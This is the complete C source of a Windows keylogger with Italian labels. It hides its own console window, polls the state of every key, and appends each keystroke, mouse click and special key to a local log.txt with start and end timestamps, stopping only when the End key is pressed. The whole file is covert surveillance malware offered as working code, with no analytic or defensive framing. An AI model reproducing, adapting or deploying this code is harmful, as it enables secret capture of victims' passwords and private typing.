#include <stdio.h>
#include <ctype.h>
#include <windows.h>

const int virtual_keys[] = {
    VK_LBUTTON, VK_MBUTTON, VK_RBUTTON, VK_SHIFT, VK_BACK, VK_DELETE,
    VK_RETURN, VK_TAB, VK_CAPITAL, VK_CONTROL, VK_MENU,
    VK_HOME, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, VK_ESCAPE, VK_SPACE,
    VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4,
    VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9,
    VK_MULTIPLY, VK_ADD, VK_SEPARATOR, VK_SUBTRACT, VK_DECIMAL,
    VK_DIVIDE
};

const char* descriptions[] = {
    "[TASTO_SINISTRO]\n", "[TASTO_CENTRALE]\n", "[TASTO_DESTRO]\n", "[SHIFT]", "[CANCELLA]", "[CANC]",
    "[INVIO]\n", "[TAB]\t", "[CAPS_LOCK]", "[CTRL]", "[ALT]",
    "[HOME]\n", "[SINISTRA]\n", "[DESTRA]\n", "[SU]\n", "[GIU]\n", "[ESC]\n", " ",
    "0", "1", "2", "3", "4",
    "5", "6", "7", "8", "9",
    "*", "+", "-", ".", "/"
};

int isMaiusc(){
	if(GetKeyState(VK_CAPITAL) == 1){
		if (GetKeyState(VK_SHIFT) < 0) // se è premuto
			return 0;
		return 1;
	}
	else
		if (GetKeyState(VK_SHIFT) < 0)
			return 1;
	return 0;
}

char *get_time(){
	time_t rawtime;
	struct tm *timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	return asctime(timeinfo);
}

int Save(int _key, char* file){
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	Sleep(10);
	short size = sizeof(virtual_keys)/sizeof(virtual_keys[0]);
	for(int i=0; i<size; i++){
		if(_key == virtual_keys[i]){
			fprintf(OUTPUT_FILE, "%s", descriptions[i]);
			fclose(OUTPUT_FILE);
			return 0;
		}
	}
	if(_key == VK_END){
		fprintf(OUTPUT_FILE, "\n\n--------------------------------------------------\n");
		fprintf(OUTPUT_FILE, "FINE: %s", get_time());
		fprintf(OUTPUT_FILE, "--------------------------------------------------\n");
		fclose(OUTPUT_FILE);
		return 1; // l'ho messo per far terminare il programma
	}
	if(_key != 0){
		if(isMaiusc()){
			_key = toupper(_key);
			fprintf(OUTPUT_FILE, "%s", &_key);
			fclose(OUTPUT_FILE);
			return 0;
		}
		_key = tolower(_key);
		fprintf(OUTPUT_FILE, "%s", &_key);
		fclose(OUTPUT_FILE);
	}
	return 0;
}

int main(){
	FreeConsole();
	FILE *OUTPUT_FILE;
	OUTPUT_FILE=fopen("log.txt", "a+");
	fprintf(OUTPUT_FILE, "--------------------------------------------------\n");
	fprintf(OUTPUT_FILE, "INIZIO: %s", get_time());
	fprintf(OUTPUT_FILE, "--------------------------------------------------\n\n");
	fclose(OUTPUT_FILE);
	char i;
	while(1){
		Sleep(10);
		for(i=8; i<=255; i++){
			if(GetAsyncKeyState(i) == -32767){
				if(Save(i, "log.txt"))
					return 0;
			}
		}
	}
	return 0;
}	